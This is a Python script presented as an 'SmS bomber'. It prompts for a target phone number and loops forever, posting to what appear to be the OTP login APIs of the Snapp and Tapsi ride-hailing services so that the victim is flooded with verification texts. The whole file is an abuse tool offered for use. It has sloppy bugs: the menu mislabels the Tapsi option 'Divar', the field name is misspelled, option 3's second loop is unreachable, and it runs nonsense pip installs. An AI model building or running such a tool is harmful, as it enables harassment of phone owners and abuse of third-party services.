#importing

import requests,time,os

#import pyfiglet

#API

url = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"

urlt = "https://api.tapsi.cab/api/v2/user"

#colors

class color:

    red = '\033[91m'

    sabz = '\033[92m'

    sefid = '\033[0m'

    narenji = '\033[93m'

    abi_kamrang = '\033[94m'

#qwertyuiop = pyfiglet.figlet_format ('updated ?', font = 'banner3-D')

#print(qwertyuiop)

#upgrad

uipl = input(color.red+'    Do you want the required libraries to be installed or    updated automatically?     n/y?      ')

if uipl == ('y'):

    print(color.sabz+'      ok')

    time.sleep(2)

    print(color.sabz+'      loading')

    print(color.sabz+'      loading.')

    time.sleep(1)

    print(color.sabz+'      loading..')

    time.sleep(2)

    print(color.sabz+'      loading...')

    os.system('clear')

    os.system('pip install os')

    os.system('pip install requests')

    os.system('pip install time')

    os.system('pip install pyfiglet')

    os.system('pip install colorama')

    os.system('python -m pip install pip')

    os.system('pip install pip')

    print(color.sabz+'.')

    os.system('pip')

    os.system('cls')

    os.system('clear')

if uipl == ('n'):

    print(color.sabz+'      ok')

    time.sleep(2)

    print(color.sabz+'      loading')

    print(color.sabz+'      loading.')

    print(color.sabz+'      loading..')

    time.sleep(1)

    print(color.sabz+'      loading...')

    time.sleep(1)

    print(color.sabz+'      starting...')

    os.system('clear')

    print('')

    print('')

    print('')

    print('')

    

    

 

 

 

 

#Welcoming

print('''    ''')

print('''    ''')

print('''    ''')

print('''    ''')

print('''     ''')

#k = pyfiglet.figlet_format ('SmS bomber', font = 'standard')

#print(k)

print(color.sabz+'\tW E L C O M   T O   S m S   B O M B E R ')

print(color.sefid+'-----------------------------------------------------------') 

print('''        ''')

time.sleep(2)

print('''     ''')

print(color.abi_kamrang+'''\tStarting SmS bomber ''')

print('''     ''')

print('''    ''')

print(color.red+'    [   1   ]       Sb   snap')

print(color.red+'    [   2   ]       Sb   Divar')

print(color.red+'    [   3   ]       Sb   1+2')

print(color.sefid+'-----------------------------------------------------------')

print('''     ''')

T = input(color.red+'      Enter number>>>  ')

    

#SmS bomber snap

if T == ('1'):

    target = input("""         Enter phone »»»      """)

    while True:

        pyload = {"ellphone" : target}

        u = requests.post(url, data=pyload )

        print(color.abi_kamrang+"""         SmSbomber !!!""")

#SmS bomber Divar

if T == ('2'):

    target = input("""         Enter phone    »»»      """)

    while True:

        pyloed = {"ellphone" : target}

        u = requests.post(urlt, data=pyloed )

        print(color.sabz+"""        SmS bomber !!!""")

    

#SmS bomber snap,Divar

if T == ('3'):

    target = input(color.sabz+"""         Enter phone »»»      """)

    while True:

        pyload = {"ellphone" : target}

        u = requests.post(url, data=pyload )

        print(color.abi_kamrang+"""         SmSbomber !!!""")

    while True:

        pyloed = {"ellphone" : target}

        u = requests.post(urlt, data=pyloed )

        print(color.sabz+"""        SmS bomber !!!""")

        

